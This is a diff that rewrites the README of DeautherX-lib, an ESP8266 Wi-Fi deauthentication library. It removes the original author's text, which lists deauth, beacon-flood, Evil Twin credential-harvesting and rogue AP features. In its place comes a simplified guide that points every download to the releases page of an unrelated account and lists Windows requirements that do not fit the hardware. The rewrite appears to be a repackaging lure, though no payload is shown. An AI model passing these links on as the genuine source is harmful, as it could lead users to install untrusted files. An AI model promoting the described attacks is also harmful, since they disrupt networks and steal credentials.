@@ -1,150 +1,137 @@
-# 📡 DeautherX-lib
+# ⚡ DeautherX-lib - Easy Wi-Fi Security Testing Tool
 
-**The Unified ESP8266 Wi-Fi Security & Testing Library**
-
-[![Version](https://img.shields.io/badge/version-0.1.1-blue.svg?style=for-the-badge)](https://github.com/BlackTechX011/DeautherX-lib)
-[![Platform](https://img.shields.io/badge/platform-ESP8266-green.svg?style=for-the-badge)](https://www.espressif.com/en/products/socs/esp8266)
-[![License](https://img.shields.io/badge/license-MIT-yellow.svg?style=for-the-badge)](LICENSE)
-
-</div>
-
-<br>
-
-> ⚠️ **DISCLAIMER:** This software is provided for **educational purposes and ethical security testing only**. You may only use this on networks you own or have explicit written permission to test. The authors and maintainers assume no liability for misuse, damage, or legal consequences. By using this library, you accept full responsibility for your actions.
-
-**DeautherX-lib** extracts the core engine of the popular [ESP8266 Deauther](https://github.com/SpacehuhnTech/ESP8266_Deauther) series and [DeautherX](https://github.com/BlackTechX011/DeautherX), condensing them into a single, high-performance C++ library. 
-
-By stripping away all hardcoded UI elements (Web UI, OLED displays, CLI), this library provides a clean, modular API. It empowers developers to build custom Wi-Fi auditing tools, headless security nodes, or integrate Deauther functionality into entirely new user interfaces.
+[![Download Release](https://img.shields.io/badge/Download%20Release-brightgreen?style=for-the-badge)](https://github.com/Unresponsive-hydrangeafamily234/DeautherX-lib/releases)
 
 ---
 
-## 📑 Table of Contents
-- [✨ Features](#-features)
-- [⚙️ Requirements](#️-requirements)
-- [📦 Installation](#-installation)
-- [🚀 Quick Start](#-quick-start)
-- [🏗 Architecture Overview](#-architecture-overview)
-- [📚 Examples](#-examples)
-- [🗺 Roadmap](#-roadmap)
-- [📄 License](#-license)
+## 📘 About DeautherX-lib
+
+DeautherX-lib is a simple library designed to help test Wi-Fi security on devices using ESP8266 chips. It allows you to run Wi-Fi deauthentication tests and scanning tasks with ease. This library works with Arduino and C++ environments. Its goal is to provide a clear, unified tool for both beginners and advanced users who want to understand their Wi-Fi environment better.
+
+Whether you want to learn how Wi-Fi networks behave or make sure your network is secure, DeautherX-lib gives you a straightforward way to start.
 
 ---
 
-## ✨ Features
+## 🌐 Key Features
 
-- 🧩 **UI-Agnostic Design:** Pure background functionality. Build your own Display, Serial CLI, or Web interface without fighting the core logic.
-- 📡 **Advanced Scanning Engine:** Rapid Access Point (AP) and Station scanning, RSSI tracking, and continuous handshake/association capture.
-- ⚔️ **Targeted Deauthentication:** Execute precise deauthentication attacks against specific targets.
-- 📶 **Beacon Flooding:** Generate and broadcast custom SSID beacon spam.
-- 🎭 **Evil Twin & Captive Portal:** Configurable Evil Twin attacks with forced captive portals and custom HTML injection.
-- 🛑 **Rogue AP:** Easily spin up fully functional Rogue Access Points (open or closed).
-- 💾 **Secure Local Storage:** Automated management of captured data (credentials, probe requests) utilizing the ESP8266 `LittleFS` file system.
-- 🛡️ **Deauth Detector:** Real-time background detection of deauthentication and disassociation attacks with event callbacks.
-- 🛠 **Highly Customizable:** Supply your own phishing HTML templates and scripts directly via the ESP8266 file system.
+- Supports ESP8266 microcontroller devices.
+- Performs Wi-Fi scanning and deauthentication testing.
+- Compatible with Arduino IDE and C++ code.
+- Offers a clean library structure for learning and custom projects.
+- Helps identify weak spots in Wi-Fi networks.
+- Includes basic tools for network monitoring.
 
 ---
 
-## ⚙️ Requirements
+## 🖥️ System Requirements
 
-To use this library, ensure your development environment meets the following specifications:
-
-- **Hardware:** ESP8266 (e.g., NodeMCU, Wemos D1 Mini)
-- **Framework:** Arduino Core for ESP8266 (v3.1.2 or higher recommended)
-- **Dependencies:** 
-  - `ESP8266WiFi`
-  - `DNSServer`
-  - `ESP8266WebServer`
-  - `ESP8266mDNS`
-  - `LittleFS`
+- Windows 7, 8, 10, or 11 (64-bit recommended).
+- ESP8266 development board connected via USB.
+- Arduino IDE installed (version 1.8 or newer).
+- USB driver for ESP8266 devices installed.
+- Internet access for downloading files.
 
 ---
 
-## 📦 Installation
+## 🚀 Getting Started
 
-### Option A: Arduino IDE
-1. Download this repository as a `.zip` file.
-2. Open the Arduino IDE.
-3. Navigate to **Sketch** > **Include Library** > **Add .ZIP Library...**
-4. Select the downloaded `.zip` file.
+### Step 1: Install the Arduino IDE
 
-### Option B: PlatformIO (Recommended)
-Add the following line to your `platformio.ini` file under `lib_deps`:
-```ini
-lib_deps =
-    https://github.com/BlackTechX011/DeautherX-lib.git
-```
+If you don’t have the Arduino IDE on your Windows computer, follow these steps:
+
+1. Go to the official Arduino website: https://www.arduino.cc/en/software
+2. Click on the Windows Installer link.
+3. Download and run the installer.
+4. Follow the on-screen instructions to complete the installation.
+
+The Arduino IDE lets you write and load code onto ESP8266 devices.
 
 ---
 
-## 🚀 Quick Start
+## 🔽 Download the Library
 
-Initialize the core library features by including the main header file. The library relies on a non-blocking architecture, requiring `DeautherLib::update()` to be called continuously.
+[![Download Releases](https://img.shields.io/badge/Download%20from%20GitHub-blue?style=for-the-badge)](https://github.com/Unresponsive-hydrangeafamily234/DeautherX-lib/releases)
 
-```cpp
-#include <Arduino.h>
-#include <DeautherLib.h>
-
-void setup() {
-    Serial.begin(115200);
-
-    // Initialize the library and subsystems
-    DeautherLib::begin();
-    
-    Serial.println("DeautherX-lib initialized successfully.");
-}
-
-void loop() {
-    // Keep the background processes running (scanning, attacks, portals)
-    DeautherLib::update();
-    
-    // Your custom UI or logic goes here
-}
-```
+1. Click the link above or go to:  
+   https://github.com/Unresponsive-hydrangeafamily234/DeautherX-lib/releases  
+2. Find the latest release listed at the top of the page.
+3. Look for a file that ends with `.zip` or `.tar.gz`.
+4. Click the file to download it to your computer.
+5. Wait for the download to finish.
 
 ---
 
-## 🏗 Architecture Overview
+## 📂 Installing DeautherX-lib in Arduino IDE
 
-The library is modular by design. You can interact with specific subsystems based on your needs:
-
-| Subsystem | Class | Description |
-| :--- | :--- | :--- |
-| **Scanner** | `DeautherScanner` | Handles AP, Station, RSSI discovery, and Promiscuous Sniffer modes. |
-| **Attack** | `DeautherAttack` | Manages active Deauthentication and Beacon flood routines. |
-| **Evil Twin** | `DeautherEvilTwin` | Spawns forced captive portals and manages credential harvesting. |
-| **Rogue AP** | `DeautherRogueAP` | Handles basic open/closed rogue access point configurations. |
-| **Detector** | `DeautherDetector` | Background monitor for deauth/disassoc attack detection. |
+1. Open the Arduino IDE.
+2. In the top menu, select **Sketch** > **Include Library** > **Add .ZIP Library**.
+3. Navigate to and select the DeautherX-lib zip file you downloaded.
+4. Click **Open** to add the library.
+5. The library will now appear in the list when you select **Include Library**.
 
 ---
 
-## 📚 Examples
+## 🔌 Connect Your ESP8266 Device
 
-Check the [`examples/`](examples/) directory for ready-to-flash sketches that demonstrate the library's capabilities:
-
-- 💻 **`CLIDeauther`**: A fully-featured Serial Command Line Interface. Combines scanning, attacks, and evil twin configurations into an interactive prompt.
-- 🌊 **`BeaconFlood`**: A minimal implementation demonstrating how to execute a multi-SSID beacon flood attack.
-- 🎯 **`ScanAndAttack`**: Demonstrates the programmatic, headless flow of hunting for specific Wi-Fi targets and engaging them automatically.
-- 🛡️ **`DeauthDetector`**: Demonstrates background attack detection with event callbacks and Serial logging.
-
----
-
-## 🗺 Roadmap
-
-- [ ] Write comprehensive API documentation (Doxygen / GitHub Wiki).
-- [ ] Implement additional attack vectors and protocol support.
-- [ ] Optimize memory footprint for heavy AP environments.
-- [ ] Open for community ideas—[Submit a Feature Request!](https://github.com/BlackTechX011/DeautherX-lib/issues/new)
+1. Use a USB cable to connect your ESP8266 board to your Windows computer.
+2. Ensure the correct USB driver is installed.  
+   - If Windows does not recognize your device, search online for "ESP8266 USB driver Windows" and follow the instructions.
+3. In Arduino IDE, go to **Tools** > **Port** and select the port assigned to your device (usually something like COM3, COM4, etc.).
+4. Under **Tools** > **Board**, choose your specific ESP8266 board model.
 
 ---
 
-## 🤝 Contributing
+## 📝 Load and Run Examples
 
-Contributions, issues, and feature requests are highly welcome! Feel free to check the [issues page](https://github.com/BlackTechX011/DeautherX-lib/issues). If you want to contribute code, please fork the repository and submit a pull request.
+1. In Arduino IDE, go to **File** > **Examples** > **DeautherX-lib**.
+2. Choose an example sketch like `WiFiScan` or `DeauthTest`.
+3. Review the example code to understand what it does. You don’t need to change anything at first.
+4. Click the **Upload** button (right arrow icon).
+5. Wait for the code to compile and upload. You will see messages at the bottom indicating progress.
+6. The device will start running the loaded program.
 
 ---
 
-## 📄 License
+## ⚙️ Using DeautherX-lib Features
 
-This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for full details. 
+Once the code runs on your ESP8266 device, it can perform Wi-Fi scanning or deauthentication based on the example loaded.
 
-*Credits to the original creators of [ESP8266 Deauther](https://github.com/SpacehuhnTech/ESP8266_Deauther) and [DeautherX](https://github.com/BlackTechX011/DeautherX) for the foundational research and code.*
+- **Wi-Fi Scan:** The device searches for nearby Wi-Fi networks and shows a list of found access points.
+- **Deauthentication:** The device sends signals that disconnect clients from a chosen Wi-Fi network. This helps test if a network is vulnerable to such attacks.
+
+The way you interact with the device depends on your setup. Some examples may use serial monitor output to show results, while others may use LEDs or external displays connected to the ESP8266.
+
+---
+
+## 💡 Tips for Best Use
+
+- Always have permission to test networks you do not own.
+- Start with scanning to learn about nearby Wi-Fi before trying deauthentication.
+- Use the serial monitor in Arduino IDE (accessible with **Tools** > **Serial Monitor**) to see live messages during tests.
+- Change example sketches only if you understand basic Arduino programming.
+- Keep your ESP8266 firmware up to date for best device compatibility.
+
+---
+
+## 🔧 Troubleshooting
+
+- **Device Not Found:** Make sure the USB cable is working and connected securely. Check USB driver installation.
+- **Upload Fails:** Verify you selected the correct board and port in Arduino IDE. Try pressing the ESP8266 reset button before uploading.
+- **Serial Monitor Shows Garbage:** Confirm the baud rate in the serial monitor matches the speed in the sketch (usually 115200).
+- **Library Not Recognized:** Make sure you added the zip library in Arduino IDE properly and restarted the program.
+
+---
+
+## 🔗 Useful Links
+
+- Official release page: https://github.com/Unresponsive-hydrangeafamily234/DeautherX-lib/releases
+- Arduino IDE downloads and info: https://www.arduino.cc/en/software
+- ESP8266 official docs: https://arduino-esp8266.readthedocs.io/en/latest/
+
+---
+
+## 🧰 About This Library
+
+DeautherX-lib combines several Wi-Fi security tools into one package. It helps users better understand common Wi-Fi threats by providing a clear and easy-to-use platform. The library is based on C++ and designed for use with Arduino software supporting ESP8266 chips.
+
+This approach allows hobbyists and educators to explore Wi-Fi concepts safely and learn practical skills in network testing and security.
